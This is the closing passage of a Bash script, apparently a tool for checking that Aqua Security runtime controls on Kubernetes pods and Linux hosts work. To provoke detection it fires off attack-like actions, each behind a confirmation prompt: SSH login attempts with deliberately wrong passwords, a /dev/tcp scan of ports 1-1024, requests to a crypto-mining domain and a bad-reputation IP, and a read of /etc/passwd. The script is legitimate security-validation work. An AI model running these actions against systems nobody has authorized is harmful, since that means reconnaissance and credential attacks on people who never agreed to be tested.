    confirm_container_control "Executables Allowed" "Enable Executables Allowed in Enforce mode. Allow sleep and date (including their resolved image paths) but exclude uname. Allow container exec. Use an image containing all three executables." || return
    image=$(prompt_for_test_image "Image with sleep, date and uname") || return
    if create_control_pod aqua-executables-allowed-test "$image"; then
        print_colored_message text "Allowed baseline: date"
        if ! kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-executables-allowed-test -- date; then
            print_colored_message yellow "Allowed baseline failed; correct the image or policy before interpreting the negative test."
            review_container_control
            return 1
        fi
        print_colored_message text "Excluded executable: uname -a"
        if kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-executables-allowed-test -- uname -a; then
            print_colored_message text "Excluded executable ran; check the allowlist and effective policy."
        else
            print_colored_message yellow "Excluded executable failed; confirm an Executables Allowed event in Aqua."
        fi
    fi
    review_container_control
}

test_forensics() {
    print_test_header "Forensics"
    local image
    confirm_container_control "Forensics" "Enable Forensics process activity and command-argument collection in the Container Runtime Policy and the applicable Enforcer configuration. Allow container exec and the test commands. This is a collection test; successful commands are expected." || return
    image=$(prompt_for_test_image "Image with echo, id and ls") || return
    if create_control_pod aqua-forensics-test "$image"; then
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-forensics-test -- echo aqua-probe-forensics-marker || return 1
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-forensics-test -- id || return 1
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-forensics-test -- ls /tmp || return 1
        print_colored_message text "Review this pod's forensic activity in Aqua for echo, id, ls and the aqua-probe-forensics-marker argument."
        print_colored_message text "Command success verifies execution only; confirm collection in Aqua. A security incident is not required."
    fi
}

test_limit_new_privileges() {
    print_test_header "Limit New Privileges"
    local image overrides output
    confirm_container_control "Limit New Privileges" "Enable Limit New Privileges in Enforce mode and allow container exec. The test requests allowPrivilegeEscalation: true, drops capabilities, and reads NoNewPrivs from PID 1. With enforced no-new-privileges, expect NoNewPrivs: 1. It does not attempt a host privilege escalation." || return
    image=$(prompt_for_test_image "Image with sleep and cat") || return
    overrides='{"spec":{"containers":[{"name":"aqua-new-privileges-test","securityContext":{"allowPrivilegeEscalation":true,"capabilities":{"drop":["ALL"]}}}]}}'
    if create_control_pod aqua-new-privileges-test "$image" "$overrides"; then
        output=$(kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-new-privileges-test -- cat /proc/1/status) || return 1
        printf '%s\n' "$output" | awk '/^NoNewPrivs:/ {print}'
        if printf '%s\n' "$output" | awk '/^NoNewPrivs:/ && $2 == 1 {found=1} END {exit !found}'; then
            print_colored_message text "PID 1 has no-new-privileges set. Check effective policy and admission mutations to establish which control set it."
        else
            print_colored_message yellow "NoNewPrivs was not confirmed as 1; review policy scope and runtime support."
        fi
    fi
    review_container_control
}

test_registries_allowed() {
    print_test_header "Registries Allowed"
    local image
    confirm_container_control "Registries Allowed" "Configure the allowed registry list in your Container Runtime Policy and enable enforcement. Select a real, accessible image from a registry excluded from that list. Ensure pull credentials are configured if needed and other image controls do not mask this test." || return
    image=$(prompt_for_test_image "Image from a registry outside the allowed list") || return
    print_colored_message text "The default uses Docker Hub; it triggers this test only if Docker Hub is excluded."
    if create_control_pod aqua-registries-allowed-test "$image"; then
        print_colored_message text "Pod became ready; review the registry allowlist and effective policy."
    else
        print_colored_message yellow "Pod did not become ready. Distinguish an Aqua registry denial from missing credentials or ImagePullBackOff."
    fi
    review_container_control
}

test_brute_force_login_detection() {
    print_test_header "Brute Force Login Detection" "Host Runtime Policy"
    local host login_user port attempts proceed attempt status key_file
    local -a auth_options

    print_instructions "Apply a Host Runtime Policy with Brute Force Login Detection enabled to the target Linux host.
Ensure the host is monitored by an Aqua Enforcer and its SSH service accepts your selected authentication method.
Use a dedicated test account and check its lockout settings before testing.
Enter an intentionally incorrect password at each SSH password prompt; no passwords are stored by this script.
Choose an attempt count that meets your configured detection threshold/window (maximum 10 per run).
This test connects directly to host SSH; it does not deploy or exec into a container."
    command -v ssh >/dev/null 2>&1 || { echo "OpenSSH client is required."; return 1; }
    read -r -p "$(format_prompt "Monitored host IP or hostname: ")" host || return
    if [[ ! "$host" =~ ^[a-zA-Z0-9][a-zA-Z0-9.:-]*$ ]]; then
        print_colored_message text "Invalid hostname or IP address."; return 1
    fi
    read -r -p "$(format_prompt "Dedicated test account username: ")" login_user || return
    if [[ ! "$login_user" =~ ^[a-zA-Z_][a-zA-Z0-9_.-]*$ ]]; then
        print_colored_message text "Invalid username."; return 1
    fi
    read -r -p "$(format_prompt "SSH port [22]: ")" port || return
    port=${port:-22}
    if [[ ! "$port" =~ ^[0-9]{1,5}$ ]] || (( 10#$port < 1 || 10#$port > 65535 )); then
        print_colored_message text "Invalid SSH port."; return 1
    fi
    read -r -p "$(format_prompt "SSH private key file path (e.g. ~/.ssh/test.pem; Enter for password authentication): ")" key_file || return
    if [[ -n "$key_file" ]]; then
        case "$key_file" in
            '~/'*) key_file="$HOME/${key_file#\~/}" ;;
        esac
        if [[ ! -f "$key_file" || ! -r "$key_file" ]]; then
            print_colored_message text "SSH key file must be an existing, readable file."; return 1
        fi
        auth_options=(-i "$key_file" -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes)
        print_colored_message text "Using key authentication. SSH will prompt for the key passphrase if required."
        print_colored_message yellow "A valid authorized key succeeds and stops this test; successful logins do not simulate brute-force failures."
    else
        auth_options=(-o PreferredAuthentications=password -o PubkeyAuthentication=no)
    fi
    read -r -p "$(format_prompt "Number of login attempts [5, maximum 10]: ")" attempts || return
    attempts=${attempts:-5}
    if [[ ! "$attempts" =~ ^([1-9]|10)$ ]]; then
        print_colored_message text "Enter an attempt count from 1 to 10."; return 1
    fi
    read -r -p "$(format_prompt "Proceed with $attempts test logins to $host? (y/n): ")" proceed || return
    [[ "$proceed" =~ ^[Yy]$ ]] || return 0

    for ((attempt=1; attempt<=attempts; attempt++)); do
        print_colored_message text "Login attempt $attempt/$attempts."
        [[ -n "$key_file" ]] || echo "Enter an intentionally incorrect password."
        if ssh -p "$port" -l "$login_user" \
            "${auth_options[@]}" \
            -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 -o ConnectionAttempts=1 \
            -o ControlMaster=no -o ControlPath=none "$host" true; then
            print_colored_message yellow "Authentication succeeded unexpectedly; stopping the test."
            return 1
        else
            status=$?
        fi
        if [[ "$status" -ne 255 ]]; then
            print_colored_message yellow "SSH stopped with status $status; ending the test."
            return 1
        fi
        print_colored_message yellow "SSH did not complete successfully. Verify its output shows an authentication failure, not a connection or host-key error."
    done
    print_colored_message yellow "Review the host authentication logs to confirm the failed login attempts."
    print_audit_review
    print_colored_message text "An Aqua detection depends on the Host Runtime Policy threshold, time window, and host coverage."
    print_colored_message text "No test resources were created; host authentication and audit records remain for review."
}

# Quote remote scripts for the SSH login shell; do not interpolate user input as code.
host_ssh() {
    local quoted
    quoted=${1//\'/\'\\\'\'}
    ssh -T -p "$AQUA_PROBE_HOST_PORT" -l "$AQUA_PROBE_HOST_USER" \
        "${AQUA_PROBE_HOST_AUTH[@]}" -o ConnectTimeout=10 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=15 -o ServerAliveCountMax=2 \
        -o ControlMaster=no -o ControlPath=none "$AQUA_PROBE_HOST" "bash -c '$quoted'"
}

configure_host_runtime() {
    local host user port key os
    AQUA_PROBE_HOST_READY=0
    command -v ssh >/dev/null 2>&1 || return 1
    print_instructions "Select an authorized Linux lab host monitored by an Aqua Enforcer.
Commands run directly as the SSH user, never through Kubernetes or Docker. No sudo is added.
SSH host-key verification stays enabled. Use a dedicated account and verify the destination."
    read -r -p "$(format_prompt 'Monitored host IP or hostname: ')" host || return 1
    [[ "$host" =~ ^[a-zA-Z0-9][a-zA-Z0-9.:-]*$ ]] || { print_colored_message red 'Invalid host.'; return 1; }
    read -r -p "$(format_prompt 'SSH username: ')" user || return 1
    [[ "$user" =~ ^[a-zA-Z_][a-zA-Z0-9_.-]*$ ]] || { print_colored_message red 'Invalid username.'; return 1; }
    read -r -p "$(format_prompt 'SSH port [22]: ')" port || return 1
    port=${port:-22}
    [[ "$port" =~ ^[0-9]{1,5}$ ]] && (( 10#$port >= 1 && 10#$port <= 65535 )) || { print_colored_message red 'Invalid port.'; return 1; }
    read -r -p "$(format_prompt 'SSH key file (.pem; Enter for SSH default authentication): ')" key || return 1
    case "$key" in '~/'*) key="$HOME/${key#\~/}" ;; esac
    AQUA_PROBE_HOST_AUTH=()
    if [[ -n "$key" ]]; then
        [[ -f "$key" && -r "$key" ]] || { print_colored_message red 'Key file must exist and be readable.'; return 1; }
        AQUA_PROBE_HOST_AUTH=(-i "$key" -o IdentitiesOnly=yes)
    fi
    AQUA_PROBE_HOST=$host AQUA_PROBE_HOST_USER=$user AQUA_PROBE_HOST_PORT=$port
    print_colored_message blue "Checking Linux SSH host: $user@$host:$port"
    os=$(host_ssh 'uname -s' </dev/null) || { print_colored_message red 'SSH preflight failed.'; return 1; }
    [[ "$os" == Linux ]] || { print_colored_message red 'A Linux host with Bash is required.'; return 1; }
    AQUA_PROBE_HOST_READY=1
}

confirm_host_control() {
    local title="$1" instructions="$2" proceed
    print_test_header "$title" 'Host Runtime Policy'
    [[ "${AQUA_PROBE_HOST_READY:-0}" == 1 ]] || configure_host_runtime || return 1
    print_instructions "Apply the $title control in a Host Runtime Policy scoped to this host, not a Container Runtime Policy.
Confirm Aqua Enforcer coverage, supported OS/tenant features, and policy mode. Other controls must not mask this test.
$instructions"
    print_colored_message yellow "Target: $AQUA_PROBE_HOST_USER@$AQUA_PROBE_HOST:$AQUA_PROBE_HOST_PORT"
    # Host tests always require confirmation, including with --no-instructions.
    read -r -p "$(format_prompt 'Run this test on the authorized host? Type yes: ')" proceed || return 1
    [[ "$proceed" == yes ]]
}

review_host_control() {
    print_audit_review
    print_colored_message text "Filter by host $AQUA_PROBE_HOST and the test time; confirm the matching Host Runtime Policy."
    print_colored_message yellow 'Command failure alone is not evidence of an Aqua block. Check SSH, dependencies, permissions, network errors, and Aqua events. Successful commands do not prove detection either.'
}

run_host_command() {
    local status=0
    print_colored_message blue "$1"
    host_ssh "$1" </dev/null || status=$?
    print_colored_message text "Remote exit status: $status"
    review_host_control
    return "$status"
}

test_host_cryptocurrency_mining() {
    confirm_host_control 'Block Cryptocurrency Mining' 'Enable the control. Requires wget; contacts http://crypto-loot.com once, with a 15-second timeout. Response data is discarded and never executed.' || return
    run_host_command 'wget --timeout=15 --tries=1 --max-redirect=0 -O /dev/null http://crypto-loot.com'
}

test_host_dns_ip_reputation() {
    confirm_host_control 'DNS/IP Reputation' 'Enable reputation protection. Requires curl; contacts http://68.183.212.246 with a 15-second timeout. Response data is discarded and never executed.' || return
    run_host_command 'curl --connect-timeout 5 --max-time 15 --output /dev/null http://68.183.212.246'
}

test_host_file_block() {
    confirm_host_control 'File Block' "Add /etc/passwd to blocked files. The test runs cat /etc/passwd as the SSH user; it does not modify the file. Output includes local account information." || return
    run_host_command 'cat /etc/passwd'
}

test_host_package_block() {
    confirm_host_control 'Package Block' 'Add tar to blocked packages and ensure tar is installed. The test runs tar with no arguments, matching the container signature. Its normal usage error is NOT evidence of an Aqua block.' || return
    run_host_command 'tar'
}

test_host_forensics() {
    confirm_host_control 'Forensics' 'Enable host process activity and command-argument collection. This collection test runs echo, id, and ls /tmp. Successful execution is expected; verify the marker and processes in host forensic activity, not necessarily an incident.' || return
    run_host_command 'echo aqua-probe-forensics-marker; id; ls /tmp'
}

test_host_file_integrity_monitoring() {
    confirm_host_control 'File Integrity Monitoring' 'Monitor /tmp/aqua-probe-host-fim-* recursively (or its matching equivalent in your policy) for create, modify, permissions, and delete events. Uses a new private directory and disposable app.conf/backdoor.conf files. Never modifies real /etc/sudoers. Cleanup runs on normal exit and catchable signals; forced termination or host loss can require manual cleanup of the printed directory.' || return
    local script
    script=$(cat <<'HOST_FIM'
set -e
umask 077
dir=$(mktemp -d /tmp/aqua-probe-host-fim-XXXXXXXX)
printf 'Owned FIM test directory: %s\n' "$dir"
cleanup() {
    if ! { rm -f -- "$dir/app.conf" "$dir/backdoor.conf" && rmdir -- "$dir"; }; then
        printf 'Cleanup incomplete; review ONLY this test directory: %s\n' "$dir" >&2
        return 1
    fi
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' HUP TERM
printf 'debug=false\n' > "$dir/app.conf"
printf 'malicious change\n' > "$dir/backdoor.conf"
printf 'debug=true\n' >> "$dir/app.conf"
chmod 777 "$dir/app.conf"
rm -- "$dir/app.conf"
HOST_FIM
)
    run_host_command "$script"
}

test_host_port_scanning_detection() {
    local target script
    print_colored_message yellow 'Scan only a destination you own or are explicitly authorized to test.'
    read -r -p "$(format_prompt 'Authorized scan target IPv4/hostname [10.0.0.1]: ')" target || return 1
    target=${target:-10.0.0.1}
    [[ "$target" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*$ ]] || { print_colored_message red 'Invalid scan target.'; return 1; }
    confirm_host_control 'Port Scanning Detection' "Enable host Port Scanning Detection. Requires Bash and timeout. Scans TCP ports 1-1024 on $target using /dev/tcp, with one-second attempts and at most 16 concurrent probes. Tune the detection threshold/window; bounded concurrency may affect detection. No services or listeners are created." || return
    script="target='$target'"$'\n'
    script+=$(cat <<'HOST_SCAN'
command -v timeout >/dev/null || exit 127
trap 'jobs -pr | xargs -r kill; exit 130' INT TERM HUP
for p in {1..1024}; do
    timeout 1 bash -c 'echo > /dev/tcp/$1/$2' _ "$target" "$p" 2>/dev/null &
    if (( p % 16 == 0 )); then wait; fi
done
wait
HOST_SCAN
)
    run_host_command "$script"
}

test_host_secure_ai() {
    local mode="$1"
    confirm_host_control "Secure AI - $mode" 'Enable Secure AI host coverage. Requires native Python 3 and outbound HTTPS to api.openai.com. Sends one small paid API request from the host (no Kubernetes app). Confirm tenant/Enforcer support and model access. For Unauthorized Models, set Service OpenAI and Model Name to the selected model, e.g. OpenAI@gpt-4. API authentication, billing, or unavailable-model errors do not prove an Aqua block.' || return
    # Isolate secrets and disable tracing without losing the selected SSH connection.
    (
    set +x
    local model key code command status=0
    read -r -p "$(format_prompt 'OpenAI model (must match the policy) [gpt-4]: ')" model || return 1
    model=${model:-gpt-4}
    [[ "$model" =~ ^[a-zA-Z0-9][a-zA-Z0-9._:-]*$ ]] || { print_colored_message red 'Invalid model name.'; return 1; }
    read -r -s -p "$(format_prompt 'OpenAI API key (hidden; used only for this request): ')" key || return 1
    echo
    [[ -n "$key" ]] || { print_colored_message red 'API key cannot be empty.'; return 1; }
    code=$(cat <<'HOST_AI'
import json, sys, urllib.request, urllib.error
key = sys.stdin.readline().strip()
body = json.dumps({"model": sys.argv[1], "messages": [{"role": "user", "content": "Reply with OK. Aqua Probe host discovery test."}], "max_tokens": 8}).encode()
request = urllib.request.Request("https://api.openai.com/v1/chat/completions", data=body, headers={"Authorization": "Bearer " + key, "Content-Type": "application/json"})
try:
    with urllib.request.urlopen(request, timeout=30) as response:
        print("OpenAI HTTP status:", response.status)
except urllib.error.HTTPError as error:
    print("OpenAI HTTP error:", error.code, "- review provider access and Aqua evidence.")
    sys.exit(1)
except Exception:
    print("Request failed; check connectivity, TLS trust, and Aqua evidence. Credentials are not printed.")
    sys.exit(1)
HOST_AI
)
    printf -v command 'python3 -c %q %q' "$code" "$model"
    printf '%s\n' "$key" | host_ssh "$command" || status=$?
    unset key
    print_colored_message text "Request exit status: $status"
    print_colored_message blue 'Review host AI Findings and Security Reports -> Audit for OpenAI and the selected model.'
    review_host_control
    return "$status"
    )
}

test_host_secure_ai_discovery() { test_host_secure_ai Discovery; }
test_host_secure_ai_unauthorized_models() { test_host_secure_ai 'Unauthorized Models'; }

host_runtime_menu() {
    local choice
    while true; do
        print_test_header 'Host Runtime Controls' 'Direct SSH | Linux host | No Kubernetes checks'
        print_menu_option 1 'Block Cryptocurrency Mining'
        print_menu_option 2 'Brute Force Login Detection'
        print_menu_option 3 'DNS/IP Reputation'
        print_menu_option 4 'File Block'
        print_menu_option 5 'File Integrity Monitoring'
        print_menu_option 6 'Forensics'
        print_menu_option 7 'Package Block'
        print_menu_option 8 'Port Scanning Detection'
        print_menu_option 9 'Secure AI - Discovery'
        print_menu_option 10 'Secure AI - Unauthorized Models'
        print_menu_option 11 'Select/change SSH host' teal
        print_menu_option 0 'Leave Host Runtime menu (exit in --host-runtime mode)' yellow
        read -r -p "$(format_prompt 'Select a host control (0-11): ')" choice || return 0
        case "$choice" in
            0) return 0 ;;
            1) test_host_cryptocurrency_mining ;;
            2) test_brute_force_login_detection ;;
            3) test_host_dns_ip_reputation ;;
            4) test_host_file_block ;;
            5) test_host_file_integrity_monitoring ;;
            6) test_host_forensics ;;
            7) test_host_package_block ;;
            8) test_host_port_scanning_detection ;;
            9) test_host_secure_ai_discovery ;;
            10) test_host_secure_ai_unauthorized_models ;;
            11) configure_host_runtime ;;
            *) print_colored_message yellow 'Choose an option from 0 to 11.' ;;
        esac
    done
}

print_main_menu() {
    print_test_header "Security Controls" "Select a control to validate"
    print_colored_message blue "  TEST ENVIRONMENT"
    print_menu_option 1 "Deploy/Redeploy test container" teal
    echo
    print_colored_message blue "  RUNTIME & WORKLOAD CONTROLS"
    print_menu_option 2 "Test Bad DNS/IP Reputation" text
    print_menu_option 3 "Test Block Container Exec" text
    print_menu_option 4 "Test Block Cryptocurrency Mining" text
    print_menu_option 5 "Test Block Fileless Execution" text
    print_menu_option 6 "Test Block Non-compliant Images" text
    print_menu_option 7 "Test Block Non-compliant Resources" text
    print_menu_option 8 "Test Block Non-Kubernetes Containers" text
    print_menu_option 9 "Test Block Reverse Shell" text
    print_menu_option 10 "Test Block Unregistered Images" text
    print_menu_option 11 "Test Drift Prevention" text
    print_menu_option 12 "Test Executables Blocked" text
    print_menu_option 13 "Test File Block" text
    print_menu_option 14 "Test File Integrity Monitoring" text
    print_menu_option 15 "Test Limit Container Privileges" text
    print_menu_option 16 "Test Package Block" text
    print_menu_option 17 "Test Port Block" text
    print_menu_option 18 "Test Port Scanning Detection" text
    print_menu_option 19 "Test Real-time Malware Protection [Delete action]" text
    print_menu_option 20 "Test Secure AI - Discovery" text
    print_menu_option 21 "Test Secure AI - Protection" text
    print_menu_option 22 "Test Secure AI - Unauthorized Models" text
    print_menu_option 23 "Test System Integrity Monitoring" text
    print_menu_option 24 "Test Volumes Blocked" text
    print_menu_option 25 "Test Block Outdated Images" text
    print_menu_option 26 "Test Capabilities Block" text
    print_menu_option 27 "Test Executables Allowed" text
    print_menu_option 28 "Test Forensics" text
    print_menu_option 29 "Test Limit New Privileges" text
    print_menu_option 30 "Test Registries Allowed" text
    echo
    print_colored_message blue "  HOST RUNTIME CONTROLS"
    print_menu_option 31 "Test Brute Force Login Detection [Host Runtime Policy]" text
    print_menu_option 33 "Test Block Cryptocurrency Mining [Host]" text
    print_menu_option 34 "Test DNS/IP Reputation [Host]" text
    print_menu_option 35 "Test File Block [Host]" text
    print_menu_option 36 "Test File Integrity Monitoring [Host]" text
    print_menu_option 37 "Test Forensics [Host]" text
    print_menu_option 38 "Test Package Block [Host]" text
    print_menu_option 39 "Test Port Scanning Detection [Host]" text
    print_menu_option 40 "Test Secure AI - Discovery [Host]" text
    print_menu_option 41 "Test Secure AI - Unauthorized Models [Host]" text
    print_menu_option 42 "Select/change SSH host" teal
    echo
    print_colored_message blue "  SESSION"
    print_menu_option 32 "Terminate Program" yellow
    echo
}

main() {
    print_logo
    print_welcome_message
    echo

    handle_flags "$@"
    echo

    if [[ "$AQUA_PROBE_HOST_RUNTIME" == 1 ]]; then
        host_runtime_menu
        return $?
    fi

    print_test_header 'Environment Checks' 'Kubernetes connectivity and Aqua installation'
    check_kubernetes_connection
    check_aqua_agent_daemonset
    check_aqua_kube_enforcer_deployment

    # Check if Aqua test container exists
    if check_container_existence; then
        echo "Aqua test container already exists."
        read -p "$(format_prompt "Would you like to redeploy the test application? (y/n): ")" redeploy_choice
        if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
            delete_test_container
            deploy_test_container
            echo
        else
            echo "Proceeding to menu..."
            echo
        fi
    else
        print_colored_message yellow "[!] Aqua test container does not exist - Select option 1 to deploy."
        echo
        echo "Proceeding to menu..."
        echo 
    fi
    echo

    while true; do
        print_main_menu
        read -p "$(format_prompt "Enter your choice (1-42): ")" choice || return 0

        case $choice in
            1)
                deploy_test_container
                ;;
            2)
                test_bad_dns_ip_reputation
                ;;
            3)
                test_block_container_exec
                ;;
            4)
                test_block_cryptocurrency_mining
                ;;
            5)
                test_block_fileless_execution
                ;;
            6)
                test_block_non_compliant_images
                ;;
            7)
                test_block_non_compliant_resources
                ;;
            8)
                test_block_non_kubernetes_containers
                ;;
            9)
                test_reverse_shell
                ;;
            10)
                test_block_unregistered_images
                ;;
            11)
                test_drift_prevention
                ;;
            12)
                test_executables_blocked
                ;;
            13)
                test_file_block
                ;;
            14)
                test_file_integrity_monitoring
                ;;
            15)
                test_limit_container_privileges
                ;;
            16)
                test_package_block
                ;;
            17)
                test_port_block
                ;;
            18)
                test_port_scanning_detection
                ;;
            19)
                test_realtime_malware_protection
                ;;
            20)
                test_secure_ai_discovery
                ;;
            21)
                test_secure_ai_protection
                ;;
            22)
                test_secure_ai_unauthorized_models
                ;;
            23)
                test_system_integrity_monitoring
                ;;
            24)
                test_volumes_blocked
                ;;
            25)
                test_block_outdated_images
                ;;
            26)
                test_capabilities_block
                ;;
            27)
                test_executables_allowed
                ;;
            28)
                test_forensics
                ;;
            29)
                test_limit_new_privileges
                ;;
            30)
                test_registries_allowed
                ;;
            31)
                test_brute_force_login_detection
                ;;
            32)
                terminate_program
                ;;
            33)
                test_host_cryptocurrency_mining
                ;;
            34)
                test_host_dns_ip_reputation
                ;;
            35)
                test_host_file_block
                ;;
            36)
                test_host_file_integrity_monitoring
                ;;
            37)
                test_host_forensics
                ;;
            38)
                test_host_package_block
                ;;
            39)
                test_host_port_scanning_detection
                ;;
            40)
                test_host_secure_ai_discovery
                ;;
            41)
                test_host_secure_ai_unauthorized_models
                ;;
            42)
                configure_host_runtime
                ;;
            *)
                print_colored_message yellow 'Choose an option from 1 to 42.'
                ;;
        esac

        echo
        # Add a short delay before showing the options menu again
        sleep 2
    done
}

main "$@"
